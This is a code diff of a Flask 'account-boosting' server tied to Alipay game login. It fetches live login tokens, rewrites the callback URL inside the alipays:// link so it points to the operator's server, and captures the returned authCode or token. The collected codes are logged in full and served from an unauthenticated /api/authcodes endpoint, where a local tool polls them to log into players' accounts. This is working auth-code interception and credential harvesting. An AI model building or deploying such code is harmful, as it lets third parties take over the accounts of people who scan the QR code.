@@ -1,19 +1,15 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-时光杂货店 - 永久二维码云服务器
+时光杂货店 - 代挂云服务器
 
-部署到 Railway / Render / Vercel 等免费平台
-二维码永不过期：每次扫码实时获取新token
+流程：
+  1. 用户扫码 → GET /login → 实时获取 token → 302 到支付宝
+  2. 支付宝确认后回调到我们的 /callback → 捕获 authCode
+  3. 本地工具轮询 GET /api/authcodes → 获取 authCode 列表
+  4. 本地工具用 authCode 登录游戏
 
-API:
-  GET /login        -> 实时获取token并302重定向到支付宝
-  GET /callback     -> 登录回调，保存账号信息
-  GET /admin        -> 管理页面（更新token等配置）
-  GET /             -> 首页，前端JS生成二维码
-  POST /api/token   -> 更新配置中的token
-  GET /api/accounts -> 查看已收集的账号
-  GET /api/health   -> 健康检查
+改动：二维码中的回调 URL 被修改为指向本服务器
 """
 
 import os
@@ -24,17 +20,16 @@ from datetime import datetime
 
 import requests
 from flask import Flask, request, redirect, jsonify, Response
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 
 app = Flask(__name__)
 
 # ==================== 配置 ====================
-# 管理密码（防止别人乱改你的配置）
 ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "shiguang2024")
 
-# API 地址
+# 支付宝 API 地址
 API_URL = "https://webgwmobiler.alipay.com/gameauth/com.alipay.gameauth.common.facade.service.GameCenterPcAuthFacade/getLoginToken?ctoken=bigfish_ctoken_1a76c5jk1b"
 
-# 请求头（不需要JWT token也能调通）
 API_HEADERS = {
     'accept': 'application/json, text/plain, */*',
     'content-type': 'application/json',
@@ -46,42 +41,73 @@ API_HEADERS = {
     'x-webgw-version': '2.0'
 }
 
-# 自定义配置（可通过管理页面修改）
 config = {
-    "x_game_token": "",  # 可选，不需要也能工作
     "admin_password": ADMIN_PASSWORD,
     "site_title": "时光杂货店",
     "scan_count": 0
 }
 
-# 收集的账号信息（内存中，重启丢失；可以用文件持久化）
-accounts = []
-
-# 线程锁
+# 收集的 authCode 列表
+authcodes = []  # [{'authCode': '...', 'time': '...', 'ip': '...'}]
 lock = threading.Lock()
 
 
-def fetch_fresh_token():
-    """实时获取新的登录token"""
-    headers = dict(API_HEADERS)
-    # 如果配置了自定义token就加上
-    if config["x_game_token"]:
-        headers["x-game-token-pcweb"] = config["x_game_token"]
+def get_base_url():
+    return request.host_url.rstrip('/')
 
+
+def fetch_fresh_token_and_url():
+    """
+    实时获取新的登录 token 和支付宝 URL
+    关键：修改回调 URL 为我们自己的服务器
+    """
+    headers = dict(API_HEADERS)
     try:
         resp = requests.post(API_URL, headers=headers, json={}, timeout=10)
         data = resp.json()
         if data.get('success'):
             qr_code = data['data']['qrCode']
-            return qr_code['token'], qr_code['url']
+            token = qr_code['token']
+            original_url = qr_code['url']  # alipays://... 的链接
+
+            # 解析 alipays:// URL 中的回调地址
+            # 格式通常是: alipays://platformapi/startapp?appId=xxx&url=ENCODED_CALLBACK_URL
+            # 我们需要把 url 参数替换为指向我们自己的 /callback
+            callback_url = f"{get_base_url()}/callback"
+
+            # 尝试修改回调地址
+            modified_url = _modify_callback_in_url(original_url, callback_url)
+
+            return token, modified_url
     except Exception as e:
         app.logger.error(f"fetch_fresh_token error: {e}")
     return None, None
 
 
-def get_base_url():
-    """获取当前服务的基础URL"""
-    return request.host_url.rstrip('/')
+def _modify_callback_in_url(original_url: str, new_callback: str) -> str:
+    """
+    修改 alipays:// URL 中的回调地址
+    alipays URL 格式: alipays://platformapi/startapp?appId=xxx&url=ENCODED_URL
+    """
+    from urllib.parse import parse_qs, urlparse, urlencode, urlunparse, quote
+
+    # alipays:// 协议需要特殊处理
+    if original_url.startswith('alipays://'):
+        # 提取 query 部分
+        if '?' in original_url:
+            path_part, query_part = original_url.split('?', 1)
+            params = parse_qs(query_part)
+
+            # 替换 url 参数为我们的回调
+            # 原始 url 参数通常是编码过的支付宝回调
+            params['url'] = [new_callback]
+
+            # 重新编码
+            new_query = urlencode(params, doseq=True)
+            return f"{path_part}?{new_query}"
+
+    # 如果不是 alipays:// 格式，尝试作为普通 URL 处理
+    return original_url
 
 
 # ==================== 页面路由 ====================
@@ -91,8 +117,8 @@ def index():
     """首页 - 展示二维码"""
     base = get_base_url()
     login_url = f"{base}/login"
-    # 用 Google Chart API 生成二维码图片URL（无需任何前端库）
     qr_img_url = f"https://api.qrserver.com/v1/create-qr-code/?size=250x250&data={login_url}"
+
     return f"""<!DOCTYPE html>
 <html lang="zh-CN">
 <head>
@@ -105,90 +131,53 @@ def index():
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
+            display: flex; flex-direction: column;
+            align-items: center; justify-content: center;
             color: #333;
         }}
         .container {{
-            background: white;
-            border-radius: 20px;
-            padding: 40px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            text-align: center;
-            max-width: 400px;
-            width: 90%;
+            background: white; border-radius: 20px;
+            padding: 40px; box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center; max-width: 400px; width: 90%;
         }}
         h1 {{ color: #667eea; margin-bottom: 10px; font-size: 24px; }}
         .subtitle {{ color: #999; margin-bottom: 30px; font-size: 14px; }}
         .qr-box {{
-            background: #f8f9fa;
-            border-radius: 12px;
-            padding: 20px;
-            margin: 20px 0;
-            display: inline-block;
+            background: #f8f9fa; border-radius: 12px;
+            padding: 20px; display: inline-block;
         }}
-        .qr-box img {{
-            width: 250px;
-            height: 250px;
-            display: block;
-        }}
-        .qr-fallback {{
-            width: 250px;
-            height: 250px;
-            display: none;
-            justify-content: center;
-            align-items: center;
-            background: #eee;
-            border-radius: 8px;
-            font-size: 14px;
-            color: #666;
-        }}
+        .qr-box img {{ width: 250px; height: 250px; display: block; }}
         .tip {{
-            background: #fff3cd;
-            border: 1px solid #ffc107;
-            border-radius: 8px;
-            padding: 12px;
-            margin: 20px 0;
-            font-size: 13px;
-            color: #856404;
+            background: #fff3cd; border: 1px solid #ffc107;
+            border-radius: 8px; padding: 12px; margin: 20px 0;
+            font-size: 13px; color: #856404;
         }}
         .badge {{
-            background: #28a745;
-            color: white;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 12px;
-            display: inline-block;
-            margin-bottom: 20px;
+            background: #28a745; color: white;
+            padding: 4px 12px; border-radius: 20px;
+            font-size: 12px; display: inline-block; margin-bottom: 20px;
         }}
         .stats {{ color: #999; font-size: 12px; margin-top: 15px; }}
-        .footer {{ color: rgba(255,255,255,0.6); font-size: 12px; margin-top: 30px; }}
         .url-link {{
-            display: inline-block;
-            margin-top: 10px;
-            padding: 8px 16px;
-            background: #667eea;
-            color: white;
-            border-radius: 8px;
-            text-decoration: none;
-            font-size: 13px;
+            display: inline-block; margin-top: 10px;
+            padding: 8px 16px; background: #667eea;
+            color: white; border-radius: 8px;
+            text-decoration: none; font-size: 13px;
         }}
         .url-link:hover {{ background: #764ba2; }}
+        .authcodes-info {{
+            background: #e8f5e9; border-radius: 8px;
+            padding: 10px; margin-top: 10px; font-size: 12px; color: #2e7d32;
+        }}
     </style>
 </head>
 <body>
     <div class="container">
         <h1>{config['site_title']}</h1>
-        <div class="subtitle">支付宝扫码登录</div>
-        <span class="badge">本码永久有效</span>
+        <div class="subtitle">代挂工具 - 支付宝扫码</div>
+        <span class="badge">实时二维码</span>
         <div class="qr-box">
-            <img src="{qr_img_url}" alt="登录二维码" 
-                 onerror="this.style.display='none';document.getElementById('fallback').style.display='flex';">
-            <div id="fallback" class="qr-fallback">
-                二维码加载失败<br>请点击下方链接
-            </div>
+            <img src="{qr_img_url}" alt="登录二维码">
         </div>
         <div class="tip">
             打开支付宝 App 扫描二维码<br>
@@ -196,8 +185,10 @@ def index():
         </div>
         <a href="{login_url}" class="url-link">点击直接跳转登录</a>
         <div class="stats">已扫码 {config['scan_count']} 次</div>
+        <div class="authcodes-info">
+            待处理 authCode: {len(authcodes)} 个
+        </div>
     </div>
-    <div class="footer">Powered by Cloud Server</div>
 </body>
 </html>"""
 
@@ -211,7 +202,7 @@ def login():
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     app.logger.info(f"[SCAN] {client_ip} at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
 
-    token, redirect_url = fetch_fresh_token()
+    token, redirect_url = fetch_fresh_token_and_url()
 
     if redirect_url:
         app.logger.info(f"[SCAN] OK -> redirecting to Alipay")
@@ -223,22 +214,45 @@ def login():
 
 @app.route('/callback')
 def callback():
-    """登录回调 - 支付宝扫码确认后回调"""
+    """
+    支付宝扫码确认后的回调
+    捕获 authCode 并保存
+    """
     params = dict(request.args)
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
 
-    account = {
+    app.logger.info(f"[CALLBACK] from {client_ip}")
+    app.logger.info(f"[CALLBACK] params keys: {list(params.keys())}")
+    app.logger.info(f"[CALLBACK] full params: {json.dumps(params, ensure_ascii=False)}")
+
+    # 尝试从多个可能的参数名中提取 authCode
+    auth_code = (
+        params.get('authCode', [None])[0]
+        or params.get('code', [None])[0]
+        or params.get('auth_code', [None])[0]
+        or params.get('token', [None])[0]
+    )
+
+    entry = {
         'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+        'ip': client_ip,
+        'authCode': auth_code,
+        'params': params,
+    }
+
+    with lock:
+        authcodes.append(entry)
+
+    # 同时也保留旧格式的 accounts 记录（兼容）
+    account_entry = {
+        'time': entry['time'],
         'ip': client_ip,
         'params': params
     }
 
-    with lock:
-        accounts.append(account)
+    if auth_code:
+        app.logger.info(f"[CALLBACK] Got authCode! length={len(auth_code)}")
 
-    app.logger.info(f"[LOGIN] {json.dumps(account, ensure_ascii=False)}")
-
-    # 返回友好页面
     return f"""<!DOCTYPE html>
 <html lang="zh-CN">
 <head>
@@ -260,192 +274,68 @@ def callback():
 </head>
 <body>
     <div class="box">
-        <h1>登录成功</h1>
-        <p>你可以关闭此页面</p>
+        <h1>{"登录成功" if auth_code else "已收到回调"}</h1>
+        <p>代挂工具正在处理中，请稍候...</p>
+        <p style="color:#999;font-size:12px;">你可以关闭此页面</p>
     </div>
 </body>
 </html>"""
 
 
-# ==================== 管理API ====================
+# ==================== API ====================
 
-@app.route('/admin')
-def admin_page():
-    """管理页面 - 更新配置、查看账号"""
-    password = request.args.get('pw', '')
-    if password != config["admin_password"]:
-        return Response("Access Denied", status=403)
-
-    return f"""<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>管理后台</title>
-    <style>
-        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
-        body {{
-            font-family: -apple-system, sans-serif;
-            background: #1a1a2e; color: #eee;
-            padding: 20px;
-        }}
-        .header {{ text-align: center; padding: 20px 0; }}
-        h1 {{ color: #667eea; }}
-        .section {{
-            background: #16213e; border-radius: 12px;
-            padding: 20px; margin: 20px auto; max-width: 600px;
-        }}
-        h2 {{ color: #667eea; margin-bottom: 15px; font-size: 18px; }}
-        label {{ display: block; margin-bottom: 5px; color: #aaa; font-size: 14px; }}
-        input, textarea {{
-            width: 100%; padding: 10px; border: 1px solid #333;
-            border-radius: 8px; background: #0f3460; color: #eee;
-            margin-bottom: 15px; font-size: 14px;
-        }}
-        textarea {{ height: 80px; font-family: monospace; }}
-        button {{
-            background: #667eea; color: white; border: none;
-            padding: 10px 24px; border-radius: 8px; cursor: pointer;
-            font-size: 14px; margin-right: 10px;
-        }}
-        button:hover {{ background: #764ba2; }}
-        .btn-danger {{ background: #dc3545; }}
-        .btn-danger:hover {{ background: #c82333; }}
-        .msg {{
-            padding: 10px; border-radius: 8px; margin-top: 10px;
-            display: none; font-size: 14px;
-        }}
-        .msg-ok {{ background: #28a745; color: white; }}
-        .msg-err {{ background: #dc3545; color: white; }}
-        table {{
-            width: 100%; border-collapse: collapse; margin-top: 10px;
-            font-size: 13px;
-        }}
-        th, td {{
-            padding: 8px; text-align: left;
-            border-bottom: 1px solid #333;
-        }}
-        th {{ color: #667eea; }}
-        .empty {{ color: #666; text-align: center; padding: 20px; }}
-    </style>
-</head>
-<body>
-    <div class="header">
-        <h1>管理后台</h1>
-        <p style="color:#666">时光杂货店二维码服务</p>
-    </div>
-
-    <div class="section">
-        <h2>配置管理</h2>
-        <label>x-game-token-pcweb（可选，不需要也能工作）</label>
-        <textarea id="tokenInput" placeholder="粘贴你的JWT token...">{config['x_game_token']}</textarea>
-        <label>站点标题</label>
-        <input id="titleInput" value="{config['site_title']}">
-        <label>管理密码</label>
-        <input id="passwordInput" type="password" placeholder="输入新密码...">
-        <div>
-            <button onclick="saveConfig()">保存配置</button>
-            <button class="btn-danger" onclick="clearAccounts()">清空账号记录</button>
-        </div>
-        <div id="msg" class="msg"></div>
-    </div>
-
-    <div class="section">
-        <h2>扫码统计</h2>
-        <p>总扫码次数: <strong>{config['scan_count']}</strong></p>
-        <p>已收集账号: <strong>{len(accounts)}</strong> 个</p>
-    </div>
-
-    <div class="section">
-        <h2>已收集账号</h2>
-        <div id="accountsList">
-            <table>
-                <tr><th>时间</th><th>IP</th><th>参数</th></tr>
-            </table>
-        </div>
-    </div>
-
-    <script>
-        async function saveConfig() {{
-            const body = {{
-                token: document.getElementById('tokenInput').value,
-                title: document.getElementById('titleInput').value,
-                password: document.getElementById('passwordInput').value
-            }};
-            try {{
-                const resp = await fetch('/api/token', {{
-                    method: 'POST',
-                    headers: {{'Content-Type': 'application/json'}},
-                    body: JSON.stringify(body)
-                }});
-                const data = await resp.json();
-                showMsg(data.ok ? 'ok' : 'err', data.msg);
-            }} catch(e) {{
-                showMsg('err', 'Network error');
-            }}
-        }}
-
-        async function clearAccounts() {{
-            if (!confirm('确定清空所有账号记录？')) return;
-            try {{
-                const resp = await fetch('/api/accounts', {{method: 'DELETE'}});
-                const data = await resp.json();
-                showMsg(data.ok ? 'ok' : 'err', data.msg);
-                if (data.ok) location.reload();
-            }} catch(e) {{
-                showMsg('err', 'Network error');
-            }}
-        }}
-
-        function showMsg(type, text) {{
-            const el = document.getElementById('msg');
-            el.textContent = text;
-            el.className = 'msg msg-' + (type === 'ok' ? 'ok' : 'err');
-            el.style.display = 'block';
-            setTimeout(() => el.style.display = 'none', 3000);
-        }}
-    </script>
-</body>
-</html>"""
+@app.route('/api/authcodes', methods=['GET'])
+def list_authcodes():
+    """获取待处理的 authCode 列表（本地工具轮询此接口）"""
+    with lock:
+        return jsonify({
+            "ok": True,
+            "count": len(authcodes),
+            "authcodes": authcodes
+        })
 
 
-@app.route('/api/token', methods=['POST'])
-def update_token():
-    """更新配置"""
-    try:
-        data = request.get_json()
-        with lock:
-            if data.get('token'):
-                config['x_game_token'] = data['token']
-            if data.get('title'):
-                config['site_title'] = data['title']
-            if data.get('password'):
-                config['admin_password'] = data['password']
-        return jsonify({"ok": True, "msg": "Config updated"})
-    except Exception as e:
-        return jsonify({"ok": False, "msg": str(e)})
+@app.route('/api/authcodes/<int:index>', methods=['DELETE'])
+def consume_authcode(index):
+    """消费（删除）一个已处理的 authCode"""
+    with lock:
+        if 0 <= index < len(authcodes):
+            removed = authcodes.pop(index)
+            return jsonify({"ok": True, "removed": removed.get('authCode', '')})
+    return jsonify({"ok": False, "msg": "index out of range"})
+
+
+@app.route('/api/authcodes/clear', methods=['POST'])
+def clear_authcodes():
+    """清空所有 authCode"""
+    with lock:
+        count = len(authcodes)
+        authcodes.clear()
+    return jsonify({"ok": True, "msg": f"Cleared {count} authcodes"})
 
 
 @app.route('/api/accounts', methods=['GET'])
 def list_accounts():
-    """查看已收集的账号"""
+    """兼容旧接口"""
     with lock:
-        return jsonify({"ok": True, "count": len(accounts), "accounts": accounts})
+        compat = [{'time': a['time'], 'ip': a['ip'], 'params': a['params']} for a in authcodes]
+        return jsonify({"ok": True, "count": len(compat), "accounts": compat})
 
 
 @app.route('/api/accounts', methods=['DELETE'])
 def clear_accounts():
-    """清空账号记录"""
-    with lock:
-        count = len(accounts)
-        accounts.clear()
-    return jsonify({"ok": True, "msg": f"Cleared {count} accounts"})
+    """兼容旧接口"""
+    return clear_authcodes()
 
 
 @app.route('/api/health')
 def health():
-    """健康检查"""
-    return jsonify({"status": "ok", "scan_count": config["scan_count"], "time": datetime.now().isoformat()})
+    return jsonify({
+        "status": "ok",
+        "scan_count": config["scan_count"],
+        "pending_authcodes": len(authcodes),
+        "time": datetime.now().isoformat()
+    })
 
 
 # ==================== 启动 ====================
